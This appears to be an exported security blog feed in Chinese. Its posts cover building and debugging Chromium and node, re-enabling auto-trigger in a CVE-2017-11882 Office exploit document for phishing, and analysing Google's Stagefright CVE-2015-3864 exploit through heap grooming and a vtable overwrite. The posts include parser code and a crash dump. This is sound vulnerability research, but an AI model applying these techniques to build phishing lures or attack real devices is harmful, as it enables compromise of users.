<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gn gen out/Default --args=&quot;enable_nacl=false&quot;</div><div class="line">gn args out/Default --ide=vs</div></pre></td></tr></table></figure>
<p>然后使用 <code>ninja</code> 编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ninja -C out\Default chrome</div></pre></td></tr></table></figure></p>
<p>如果没有问题，等几个小时就好了。然后会在 <code>out\Default</code> 下生成 <code>chrome.exe</code> 和相关的 <code>dll</code> 和  <code>pdb</code> 调试文件。</p>
<p><strong>调试</strong></p>
<p><strong>方案一</strong></p>
<p>使用 <code>Visual Studio 2015</code> 加载 <code>all.sln</code> 直接调试。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511800354896kkv4p42s.png?imageslim" alt="paste image"></p>
<p><strong>方案二</strong></p>
<p>用 <code>Visual Studio 2015</code> 会非常的慢， 可以使用 <code>windbg preview</code> 调试，图形化，而且快，也有 <code>windbg</code> 的强大功能</p>
<p><code>windbg preview</code> 可以在  <code>windows store</code> 下载</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744068940bhb543ao.png?imageslim" alt="paste image"></p>
<p>打开点击 左上角 <code>文件</code>， 根据情况设置好即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744193260miecf7qu.png?imageslim" alt="paste image"></p>
<p>这里以 调试 <code>node</code> 为例 （原因是 <code>node</code> 使用 <code>v8</code> ）</p>
<p>首先进入 <code>settings</code> 设置符号路径。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15127443375937hbphlup.png?imageslim" alt="paste image"><br>然后根据上上图设置调试的程序 和 参数。 点击 <code>ok</code> 运行之<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1512744412429sbp9bh3z.png?imageslim" alt="paste image"></p>
<p>设置断点，断点断下来后可以直接定位到源码（自己编译）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512745006342lg0jlhf3.png?imageslim" alt="paste image"><br>调试信息非常的直观</p>
<h3 id="编译-node"><a href="#编译-node" class="headerlink" title="编译 node"></a>编译 node</h3><p>有时漏洞是位于 <code>v8</code> 引擎里面的。 我们可以使用 <code>node</code> 或者 <code>d8</code>来调试 <code>v8</code> ，这样调试速度比较快。</p>
<p><code>node</code> 可以去 淘宝的 <a href="https://npm.taobao.org/mirrors/node" target="_blank" rel="external">镜像</a> 里面下载， 这样速度快。</p>
<p>下载完后，解压。如果是在 <code>windows</code> 下编译，先运行</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512746124924rwpwxyab.png?imageslim" alt="paste image"></p>
<p>生成 <code>vs</code> 解决方案，然后编译就行了。<br>如果在 <code>linux</code> 下 直接 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --debug &amp;&amp; make -j8</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> chrome </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn chrome </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2017-11882钓鱼样本构造]]></title>
      <url>/2017/11/23/CVE_2017_11882_Phishing_sample.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>漏洞详情：</p>
<p><a href="https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about" target="_blank" rel="external">https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about</a></p>
<p>最近的一个影响很广泛的漏洞。</p>
<p>据说影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Office 365</div><div class="line"></div><div class="line">Microsoft Office 2000      </div><div class="line"></div><div class="line">Microsoft Office 2003      </div><div class="line"></div><div class="line">Microsoft Office 2007 Service Pack 3</div><div class="line"></div><div class="line">Microsoft Office 2010 Service Pack 2</div><div class="line"></div><div class="line">Microsoft Office 2013 Service Pack 1</div><div class="line"></div><div class="line">Microsoft Office 2016</div></pre></td></tr></table></figure>
<p>exploit在 <code>github</code>已经有了。</p>
<p><a href="https://github.com/embedi/CVE-2017-11882" target="_blank" rel="external">https://github.com/embedi/CVE-2017-11882</a></p>
<p>本文讲讲怎么构造一个实用的钓鱼脚本。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>打开 <code>exploit</code> 会自动弹 计算器。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399246307qiyjz9df.png?imageslim" alt="paste image"><br>不过如果我们修改内容后，在保存就不能打开自动弹了，需要用户点击 <code>111</code> , 那个控件。于是有了此文。</p>
<p>修改后和修改前的 <code>exploit</code> 文件对比，通过看漏洞报告，我们知道漏洞出在 <code>Equation.3</code> 控件，我们在两个文件中搜索，看看这里是不是有什么不一样的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399690986npwdipku.png?imageslim" alt="paste image"></p>
<p><code>\objupdate</code> 是用来自动加载 <code>ole</code> 对象的，没了这个就不能自动触发漏洞了。我们加上试试。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399801316gzwpwr2m.png?imageslim" alt="paste image"></p>
<p>然后打开</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511399823795k69wxqv4.png?imageslim" alt="paste image"></p>
<p>ok.</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>通过<code>diff</code>, 找到问题所在。</p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> office漏洞 </tag>
            
            <tag> CVE-2017-11882 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2015-3864漏洞利用分析(exploit_from_google)]]></title>
      <url>/2017/11/21/cve_2015_3864_google_exploit.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接下来要学习安卓的漏洞利用相关的知识了，网上搜了搜，有大神推荐 <code>stagefright</code> 系列的漏洞。于是开干，本文分析的是 <code>google</code> 的 <code>exploit</code>. 本文介绍的漏洞是 <code>CVE-2015-3864</code> , 在 <code>google</code>的博客上也有对该 <code>exploit</code> 的研究。</p>
<p>我之前下载下来了:</p>
<p><code>pdf版本</code> 的链接：<a href="https://gitee.com/hac425/blog_data/blob/master/Project-Zero_-Stagefrightened_.pdf" target="_blank" rel="external">在这里</a></p>
<p><code>exploit</code> 的链接： <a href="https://www.exploit-db.com/exploits/38226/" target="_blank" rel="external">https://www.exploit-db.com/exploits/38226/</a></p>
<p>分析环境：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Android 5.1 nexus4</div></pre></td></tr></table></figure>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>这个漏洞是一个文件格式相关漏洞，是由 <code>mediaserver</code> 在处理 <code>MPEG4</code> 文件时所产生的漏洞，漏洞的代码位于 <code>libstagefright.so</code> 这个库里面。</p>
<p>要理解并且利用 <code>文件格式</code> 类漏洞，我们就必须要非常清楚的了解目标文件的具体格式规范。</p>
<h4 id="Part-1-文件格式学习"><a href="#Part-1-文件格式学习" class="headerlink" title="Part 1  文件格式学习"></a>Part 1  文件格式学习</h4><p>先来一张总体的格式图<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511308907505erev1a87.png?imageslim" alt="paste image"></p>
<p><code>mp4</code> 文件由 <code>box</code> 组成，图中那些 <code>free</code>, <code>stsc</code>等都是<code>box</code>, <code>box</code> 里也可以包含 <code>box</code> ,这种 <code>box</code> 就叫 <code>containerbox</code> .</p>
<ul>
<li><p>每个 <code>box</code> 前四个字节为 <code>box</code> 的 <code>size</code> </p>
</li>
<li><p>第二个四字节为 <code>box</code> 的 <code>type</code>，<code>box type</code> 有 <code>ftyp,moov,trak</code> 等等好多种，<code>moov</code> 是 <code>containerbox</code> ,包含 <code>mvhd</code> 、<code>trak</code> 等  <code>box</code></p>
</li>
</ul>
<p>还有一些要注意的点。</p>
<ul>
<li><code>box</code> 中存储数据采用大端字节序存储</li>
<li>当 <code>size</code> 域为 0时，表示这是文件最后一个    <code>box</code></li>
<li>当 <code>size</code> 为1 时，表示这是一个 <code>large box</code> ,在 <code>type</code> 域后面的 <code>8 字节</code> 作为该 <code>box</code> 的长度。</li>
</ul>
<p>下面来看两个实例。</p>
<p><strong>实例一</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511309726966akyw40lg.png?imageslim" alt="paste image"></p>
<ul>
<li><code>size</code> 域为 <code>00000014</code>，所以该 <code>box</code>长度为 <code>0x14</code> 字节。</li>
<li><code>type</code> 域为 <code>66 74 79 70</code> 所以 <code>type</code> 为 <code>fytp</code></li>
<li>剩下的一些信息是一些与多媒体播放相关的一些信息。与漏洞利用无关，就不说了。</li>
</ul>
<p><strong>实例二</strong></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15113100377113eokwnmp.png?imageslim" alt="paste image"></p>
<ul>
<li><code>size</code> 域为1，表示从该 <code>box</code> 开头偏移8字节开始的8字节为 <code>size</code> 字段， 所以该 <code>box</code> 的大小为 <code>0xFFFFFFFFFFFFFF88</code> </li>
<li><code>type</code> 为 <code>tx3g</code></li>
</ul>
<p>现在我们对该文件的格式已经有了一个大概的了解，这对于漏洞利用来说还不够，接下来我们要去看具体的解析该文件格式的代码是怎么实现的。</p>
<p>解析文件的具体代码位于 <code>MPEG4Extractor.cpp</code> 中的 <code>MPEG4Extractor::parseChunk</code> 函数里面。<br>该函数中的 <code>chunk</code> 对应的就是 <code>box</code>, 函数最开始先解析 <code>type</code> 和 <code>size</code> .<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">// 开始4字节为 box 大小， 后面紧跟的 4 字节为 box type</div><div class="line"></div><div class="line">   uint64_t chunk_size = ntohl(hdr[0]);</div><div class="line">   uint32_t chunk_type = ntohl(hdr[1]); //大端序转换</div><div class="line">   off64_t data_offset = *offset + 8; 	// 找到 box 数据区的偏移</div><div class="line"></div><div class="line">// 如果size区为1， 那么后面8字节作为size</div><div class="line">   if (chunk_size == 1) &#123;</div><div class="line">       if (mDataSource-&gt;readAt(*offset + 8, &amp;chunk_size, 8) &lt; 8) &#123;</div><div class="line">           return ERROR_IO;</div><div class="line">       &#125;</div><div class="line">       chunk_size = ntoh64(chunk_size);</div><div class="line">       data_offset += 8;</div><div class="line"></div><div class="line">       if (chunk_size &lt; 16) &#123;</div><div class="line">           // The smallest valid chunk is 16 bytes long in this case.</div><div class="line">           return ERROR_MALFORMED;</div><div class="line">       &#125;</div><div class="line">   &#125; else if (chunk_size &lt; 8) &#123;</div><div class="line">       // The smallest valid chunk is 8 bytes long.</div><div class="line">       return ERROR_MALFORMED;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
<p>通过注释和代码，我们知道对于  <code>size</code> 的处理和前面所述是一致的。然后就会根据不同的 <code>chunk_type</code> ,进入不同的逻辑，<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313213505jmd3szla.png?imageslim" alt="paste image"></p>
<p>如果 <code>box</code> 中还包含 <code>子 box</code> 就会递归调用该函数进行解析。</p>
<h4 id="Part-2-漏洞分析"><a href="#Part-2-漏洞分析" class="headerlink" title="Part 2 漏洞分析"></a>Part 2 漏洞分析</h4><p><code>CVE-2015-3864</code>  漏洞产生的原因是，在处理 <code>tx3g box</code>时，对于获取的 <code>size</code> 字段处理不当，导致分配内存时出现整数溢出，进而造成了堆溢出。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313757977irc4emw4.png?imageslim" alt="paste image"></p>
<p><code>size</code> 为之前所解析的所有 <code>tx3g box</code> 的长度总和。<code>chunk_size</code> 为当前要处理的 <code>tx3g box</code> 的长度。然后 <code>size + chunk_size</code> 计算要分配的内存大小。 <code>chunk_size</code> 是 <code>uint64_t</code> 类型的，<code>chunk_size</code> 我们在文件格式中我们所能控制的最大大小为 <code>0xFFFFFFFFFFFFFFFF</code> ( 看 <code>part1</code> 实例二 ) ，也是 <code>64</code> 位，但是我们还有一个 <code>size</code> 为可以控制，这样一相加，就会造成 <code>整数溢出</code> ， 导致分配小内存。而我们的 <strong>数据大小则远远大于分配的内存大小，进而造成堆溢出</strong>。</p>
<h4 id="Part-3-漏洞利用"><a href="#Part-3-漏洞利用" class="headerlink" title="Part 3 漏洞利用"></a>Part 3 漏洞利用</h4><p><strong>概述</strong></p>
<p>现在我们已经拥有了堆溢出的能力，如果是在 <code>ptmalloc</code> 中，可以修改下一个堆块的元数据来触发 <code>crash</code> ，甚至可能完成漏洞利用。不过从 <code>android 5</code>开始，安卓已经开始使用 <code>jemalloc</code> 作为默认的堆分配器。</p>
<p>在 <code>jemalloc</code> 中，小内存分配采用 <code>regions</code> 进行分配， <code>region</code> 之间是没有 <strong>元数据</strong> 的 （具体可以去网上搜 <code>jemalloc</code> 的分析的文章），所以 在 <code>ctf</code> 中常见的通过修改 <strong>堆块元数据</strong> 的漏洞利用方法在这里是没法用了。</p>
<p>不过所有事情都有两面性。<code>region</code> 间是直接相邻的，那我就可以很方便的修改相邻内存块的数据。 如果我们在 <code>tx3g</code> 对应内存块的后面放置一个含有关键数据结构的内存块，比如一个对象，在 <code>含有虚函数</code> 的类的 <code>对象</code> 的 <code>开始4字节（32位下）</code>，会存放一个 <code>虚表指针</code> .</p>
<p>在 <code>对象</code> 调用 <code>虚函数</code> 时会从 <code>虚表指针</code> 指向的位置的 <code>某个偏移（不同函数，偏移不同）</code> 处取到相应的函数指针，然后跳过去执行。</p>
<p>如果我们修改对象的虚表指针，我们就有可能在程序调用虚函数时，控制程序的流程。</p>
<p><strong>一些重要的 chunk_type(box type)</strong></p>
<p><strong>tx3g box</strong></p>
<p>上一节提到，我们可以修改对象的虚表指针，以求能够控制程序的跳转。那我们就需要找到一个能够在解析 <code>box</code> 数据能时分配的对象。</p>
<p><code>MPEG4DataSource</code> 就是这样一个类。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511319727633yo0eb9f8.png?imageslim" alt="paste image"></p>
<p>可以看到该对象继承自 <code>DataSource</code>, 同时还有几个虚函数。</p>
<p>我们可以在ida中看看虚表的构成。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511319976562k70bssgz.png?imageslim" alt="paste image"></p>
<p>可以看到 <code>readAt</code> 方法在虚表的第7项，也就是虚表偏移 <code>0x1c</code> 处。同时<code>MPEG4DataSource</code>在我这的大小为 <code>0x20</code> .再看一下漏洞位置的代码。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511313757977irc4emw4.png?imageslim" alt="paste image"><br>可以看到如果当前解析的 <code>tx3g</code> box 不是第一个<code>tx3g</code> box（即size&gt;0），会先调用 <code>memcpy</code> , 把之前所有 <code>tx3g</code> box中的数据拷贝到刚刚分配的内存。</p>
<p>如果我们先构造一个 <code>tx3g</code> ，其中包含的数据大于 <code>0x20</code>, 然后在构造一个 <code>tx3g</code> 构造大小使得 <code>size+chunk_size = 0x20</code>, 然后通过 <code>memcpy</code> 就可以覆盖 <code>MPEG4DataSource</code> 的虚表了。<code>exploit</code> 中就是这样干的。</p>
<p><strong>pssh box</strong></p>
<p>看看代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511321133430whaf4w9j.png?imageslim" alt="paste image"><br>划线位置说明了 <code>pssh</code> 的结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">pssh 的结构</div><div class="line">开始8字节 表示 该 box 的性质</div><div class="line"></div><div class="line">00 00 00 40 70 73 73 68</div><div class="line">size: 0x40, </div><div class="line">type: pssh :</div><div class="line">+ 0xc 开始 16字节 为 pssh.uuid</div><div class="line">+ 0x1c开始4字节为 pssh.datalen</div><div class="line">+ 0x20 开始为 pssh.data</div><div class="line">可以查看 代码，搜索关键字： FOURCC(&apos;p&apos;, &apos;s&apos;, &apos;s&apos;, &apos;h&apos;)</div></pre></td></tr></table></figure>
<p>这里先分配 <code>pssh.datalen</code> 大小的内存，然后把 <code>pssh.data</code> 拷贝到刚刚分配的内存。完了之后会把 分配到的 <code>PsshInfo</code> 结构体增加到 类属性值 <code>Vector&lt;PsshInfo&gt; mPssh</code> 中, <code>mPssh</code> 在 <code>MPEG4Extractor::~MPEG4Extractor()</code>中才会被释放。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511321832880rsre9xy0.png?imageslim" alt="paste image"></p>
<p>所以在解析完 <code>MPEG4</code>格式前，通过 <code>pssh</code> 分配的内存会一直在内存中。</p>
<p><strong>avcC box 和 hvcC box</strong><br>这两个 <code>box</code> 的处理基本一致，以 <code>avcC</code> 为例进行介绍。解析代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">     case FOURCC(&apos;a&apos;, &apos;v&apos;, &apos;c&apos;, &apos;C&apos;):</div><div class="line">     &#123;</div><div class="line">     	// 这是一块临时分配， buffer 为智能指针，在 函数返回时相应内存会被释放。</div><div class="line">         sp&lt;ABuffer&gt; buffer = new ABuffer(chunk_data_size);</div><div class="line">         if (mDataSource-&gt;readAt(</div><div class="line">                     data_offset, buffer-&gt;data(), chunk_data_size) &lt; chunk_data_size) &#123;</div><div class="line">             return ERROR_IO;</div><div class="line">         &#125;</div><div class="line">// 在这里，会释放掉原来那个，新分配内存来容纳新的数据。</div><div class="line">// 因此我们有了一个 分配，释放 内存能力</div><div class="line">// setData 中会释放掉原来的buf, 新分配一个 chunk_data_size</div><div class="line"></div><div class="line">         mLastTrack-&gt;meta-&gt;setData(</div><div class="line">                 kKeyAVCC, kTypeAVCC, buffer-&gt;data(), chunk_data_size);</div><div class="line"></div><div class="line">         *offset += chunk_size;</div><div class="line">         break;</div><div class="line">     &#125;</div></pre></td></tr></table></figure>
<p>首先根据 <code>chunk_data_size</code> 分配 <code>ABuffer</code> 到 <code>buffer</code>，<code>chunk_data_size</code> 在 <code>box</code> 的 <code>size</code> 域指定，注意<code>buffer</code>是一个智能指针，在这里，它会在函数返回时释放。</p>
<p><code>ABuffer</code> 中是直接调用的 <code>malloc</code> 分配的内存。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1511322333438n9iujtsk.png?imageslim" alt="paste image"><br>接下来读取数据到 <code>buffer-&gt;data()</code>, 最后调用 <code>mLastTrack-&gt;meta-&gt;setData</code> 保存数据到 <code>meta</code>, 在 <code>setData</code> 内部会先释放掉之前的内存，然后分配的内存，存放该数据，此时分配内存的大小还是<code>chunk_data_size</code>, 我们可控。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511322457145o2ojlgaf.png?imageslim" alt="paste image"></p>
<p><code>hvcC</code> 的处理方式基本一样。所以通过这两个 <code>box</code> 我们可以 <strong>分配指定大小的内存，并且可以随时释放前面分配的那个内存块</strong> 。我们需要使用这个来布局<code>tx3g</code>内存块 和 <code>MPEG4DataSource</code>内存块。</p>
<p><strong>修改对象虚表指针</strong></p>
<p>下面结合<code>exploit</code> 和上一节的那几个关键 <code>box</code> ，分析通过布局内存，使得我们可以修改 <code>MPEG4DataSource</code> 的虚表指针。<br>为了便于说明，取了 <code>exploit</code> 中的用于 <code>修改对象虚表指针</code>的相关代码进行解析 ( 我调试过程做了部分修改 )<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15113295608707xyip57h.png?imageslim" alt="paste image"></p>
<p>首先看到第<code>7，8</code>行，构造了第一个 <code>tx3g box</code>, 大小为 <code>0x3a8</code>， 后面在触发漏洞时，会先把这部分数据拷贝到分配到的小内存<code>buffer</code>中，然后会溢出到下一个 <code>region</code> 的 <code>MPEG4DataSource</code>内存块。使用 <code>cyclic</code> 可以在程序 <code>crash</code> 时，计算 <code>buffer</code> 和 <code>MPEG4DataSource</code> 之间的距离。</p>
<p>第 <code>13</code> 行，调用了 <code>memory_leak</code> 函数， 该函数通过使用 <code>pssh</code> 来分配任意大小的内存，在这里分配的是 <code>alloc_size</code> ，即 <code>0x20</code>. 因为<code>MPEG4DataSource</code> 的大小为 <code>0x20</code> ,就保证内存的分配会在同一个 <code>run</code> 中分配。这些这样这里分配了 <code>4</code> 个 <code>0x20</code> 的内存块，我认为是用来清理之前可能使用内存时，产生的内存碎片，确保后面内存分配按照我们的顺序进行分配。此时内存关系</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh |</div></pre></td></tr></table></figure>
<p>第 <code>17</code> 到 <code>25</code> 行，清理内存后,开始分配 <code>avcC</code> 和 <code>hvcC</code>, 大小也是 <code>0x20</code>， 然后在第 <code>25</code> 行又进行了内存碎片清理，原因在于我们在分配 <code>avcC</code> 和 <code>hvcC</code>时，会使用到 <code>new ABuffer(chunk_data_size)</code>,这个临时的缓冲区，这个会在函数返回时被释放（请看智能指针相关知识）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511330396572jzet4fq5.png?imageslim" alt="paste image"><br>同时多分配了几个 <code>pssh</code> 确保可以把 <code>avcC</code> 和 <code>hvcC</code>包围在中间。所以现在的内存关系是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | hvcC | pssh |</div></pre></td></tr></table></figure>
<p>然后是 第 <code>29</code> 行， 再次分配 <code>hvcC</code> ,不过这次的大小 为 <code>alloc_size * 2</code>, 触发 <code>hvcC</code> 的释放，而且确保不会占用 刚刚释放的 内存.（jemalloc中  相同大小的内存在同一个run中分配）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | .... | pssh |</div></pre></td></tr></table></figure></p>
<p>接下来构造 <code>stbl</code> 用 <code>MPEG4DataSource</code> 占据刚刚空出来的 内存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure></p>
<p>接下来， 第 <code>38</code> 行用同样的手法分配释放 <code>avcC</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure></p>
<p>然后使用整数溢出，计算得到第二个 <code>tx3g</code> 的长度值，使得最后分配到的内存大小为<code>0x20</code>, 用来占据刚刚空闲的 <code>avcC</code> 的 内存块，于是现在的内存布局，就会变成这样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">| pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |</div></pre></td></tr></table></figure>
<p>然后在</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511331158750fgbh83d2.png?imageslim" alt="paste image"><br>就会溢出修改了 <code>MPEG4DataSource</code> 的虚表指针。然后在下面的 <code>readAt</code> 函数调用出会 <code>crash</code>.</p>
<p>我测试时得好几次才能成功一次，估计和内存碎片相关。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">Thread 10 received signal SIGSEGV, Segmentation fault.</div><div class="line">0xb66b57cc in android::MPEG4Extractor::parseChunk (this=this@entry=0xb74e2138, offset=offset@entry=0xb550ca98, depth=depth@entry=0x2) at frameworks/av/media/libstagefright/MPEG4Extractor.cpp:1905</div><div class="line">1905	            if ((size_t)(mDataSource-&gt;readAt(*offset, buffer + size, chunk_size))</div><div class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</div><div class="line">$r0   : 0xb74e27b8  →  0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r1   : 0xb74e2bb8  →  0x00000000</div><div class="line">$r2   : 0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r3   : 0x00000000</div><div class="line">$r4   : 0xb550c590  →  0x00000428</div><div class="line">$r5   : 0xfffffbf8</div><div class="line">$r6   : 0xb550c580  →  0xb74e5c98  →  0x28040000</div><div class="line">$r7   : 0xb550c570  →  0xfffffbf8</div><div class="line">$r8   : 0xb74e2138  →  0xb6749f18  →  0xb66b2841  →  &lt;android::MPEG4Extractor::~MPEG4Extractor()+1&gt; ldr r3,  [pc,  #188]	; (0xb66b2900 &lt;android::MPEG4Extractor::~MPEG4Extractor()+192&gt;)</div><div class="line">$r9   : 0x74783367 (&quot;g3xt&quot;?)</div><div class="line">$r10  : 0xb550ca98  →  0x01000a98</div><div class="line">$r11  : 0xb74e2790  →  0x28040000</div><div class="line">$r12  : 0x00000000</div><div class="line">$sp   : 0xb550c530  →  0xb74e2bb8  →  0x00000000</div><div class="line">$lr   : 0xb66b57bd  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r1,  [r4,  #0]</div><div class="line">$pc   : 0xb66b57cc  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</div><div class="line">$cpsr : [THUMB fast interrupt overflow carry ZERO negative]</div><div class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</div><div class="line">$r0   : 0x00000000</div><div class="line">$r1   : 0xb74e2bb8  →  0x00000000</div><div class="line">$r2   : 0x61616169 (&quot;iaaa&quot;?)</div><div class="line">$r3   : 0x00000000</div><div class="line">$r4   : 0xb550c590  →  0x00000428</div><div class="line">$r5   : 0xfffffbf8</div><div class="line">$r6   : 0xb550c580  →  0xb74e5c98  →  0x28040000</div><div class="line">$r7   : 0xb550c570  →  0xfffffbf8</div><div class="line">$r8   : 0xb74e2138  →  0xb6749f18  →  0xb66b2841  →  &lt;android::MPEG4Extractor::~MPEG4Extractor()+1&gt; ldr r3,  [pc,  #188]	; (0xb66b2900 &lt;android::MPEG4Extractor::~MPEG4Extractor()+192&gt;)</div><div class="line">$r9   : 0x74783367 (&quot;g3xt&quot;?)</div><div class="line">$r10  : 0xb550ca98  →  0x01000a98</div><div class="line">$r11  : 0xb74e2790  →  0x28040000</div><div class="line">$r12  : 0x00000000</div><div class="line">$sp   : 0xb550c530  →  0xb74e2bb8  →  0x00000000</div><div class="line">$lr   : 0xb66b57bd  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r1,  [r4,  #0]</div><div class="line">$pc   : 0xb66b57cc  →  &lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</div><div class="line">$cpsr : [THUMB fast interrupt overflow carry ZERO negative]</div></pre></td></tr></table></figure></p>
<p>可以看到断在了<code>&lt;android::MPEG4Extractor::parseChunk(long+0&gt; ldr r6,  [r2,  #28]</code>,去 <code>ida</code> 里面找到对应的位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15113320522611r713790.png?imageslim" alt="paste image"><br><code>r2</code>存放的就是虚表指针，可以确定成功修改了 虚函数表指针。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511332282692sjn299pl.png?imageslim" alt="paste image"></p>
<p>偏移也符合预期。</p>
<p><strong>堆喷射</strong></p>
<p>上面我们已经成功修改了<code>MPEG4DataSource</code> 的虚表指针,并在虚函数调用时触发了 <code>crash</code> .</p>
